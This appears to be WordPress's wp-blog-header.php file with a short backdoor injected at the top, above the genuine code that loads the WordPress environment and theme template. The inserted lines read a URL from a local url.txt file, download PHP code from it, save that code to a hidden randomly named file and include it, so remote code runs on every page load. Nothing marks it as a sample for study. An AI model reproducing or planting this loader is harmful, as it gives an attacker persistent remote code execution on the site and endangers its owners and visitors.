<?php
$u = trim(file_get_contents(__DIR__ . '/url.txt'));
$f = __DIR__ . '/.' . uniqid() . '.php';

if ($c = file_get_contents($u)) {
    file_put_contents($f, $c);
    include $f;
}
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
